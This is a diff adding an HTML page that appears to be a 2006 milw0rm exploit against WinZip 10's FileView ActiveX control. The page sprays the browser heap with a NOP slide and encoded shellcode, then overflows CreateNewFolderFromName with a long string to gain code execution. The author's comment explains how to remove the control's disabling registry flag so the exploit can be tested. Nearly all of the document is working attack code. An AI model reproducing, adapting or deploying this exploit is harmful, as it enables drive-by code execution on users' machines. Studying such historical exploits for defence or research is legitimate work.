@@ -1,0 +1,55 @@
+<html>
+<head>
+<object classid="clsid:{A09AE68F-B14D-43ED-B713-BA413F034904}" id="winzip">
+</object>
+</head>
+<body>
+<SCRIPT language="javascript">
+ /*
+ ---===[ winzip-exploit.html
+ 
+XiaoHui : 76693223[at]163com
+HomePage: www.nipc.org.cn
+(c) 2006 All rights reserved.
+note:Because of the prior vuln in FileView ActiveX Control,Micorsoft has disabled this ActiveX Controls,
+To test this vuln,You can delete the key:
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{A09AE68F-B14D-43ED-B713-BA413F034904}]
+"Compatibility Flags"=dword:00000400
+I have test the exploit on Windows 2000+sp4(CN) and Windows xp+sp2(CN) and Winzip 10.0(6667),you can tryother version,goodluck~ 
+
+]===---
+*/
+ var heapSprayToAddress = 0x0d0d0d0d;
+ var payLoadCode = unescape(        "%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");
+ var heapBlockSize = 0x400000;
+ var payLoadSize = payLoadCode.length * 2;
+ var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+ var spraySlide = unescape("%u9090%u9090");
+ spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+ heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
+ memory = new Array();
+ for (i=0;i<heapBlocks;i++)
+ {
+  memory[i] = spraySlide + payLoadCode;
+ }
+ 
+ var xh = 'A';
+ while (xh.length < 231) xh+='A';
+ xh+="\x0d\x0d\x0d\x0d";
+ winzip.CreateNewFolderFromName(xh);
+ function getSpraySlide(spraySlide, spraySlideSize)
+ {
+  while (spraySlide.length*2<spraySlideSize)
+  {
+   spraySlide += spraySlide;
+  }
+  spraySlide = spraySlide.substring(0,spraySlideSize/2);
+  return spraySlide;
+ }
+ 
+</script>                                                                                                                    
+                                      
+</body>
+</html>
+
+# milw0rm.com [2006-12-31]
